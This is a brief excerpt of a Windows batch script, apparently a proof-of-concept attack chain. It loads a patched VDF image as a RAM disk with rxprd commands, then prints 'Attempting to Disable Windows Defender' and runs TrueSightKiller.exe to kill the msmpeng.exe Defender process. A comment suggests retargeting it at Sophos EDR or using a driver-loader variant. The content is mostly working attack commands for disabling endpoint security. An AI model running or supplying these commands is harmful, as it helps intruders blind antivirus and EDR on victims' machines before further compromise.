...
rxprd save 0 -a C:\Users\Smudg\Desktop\WIN_POC_Local\DumpSoftware\End2End\mini.vdf -F FLAT -s 
rxprd del 0 -s
...
rxprd add -n 3 -t DIO -v -i -fs FAT -l RAMDISK -F flat -image C:\Users\Smudg\Desktop\WIN_POC_Local\DumpSoftware\End2End\mini_patched.vdf -s
rxprd del 0 -s 
...
echo [+] Attempting to Disable Windows Defender 
:: change the target to sophos EDR if you like, there si also truesightkiller_nodriverload which relies on loading the driver with OSR laoder or somesuch first 
TrueSightKiller.exe -n msmpeng.exe
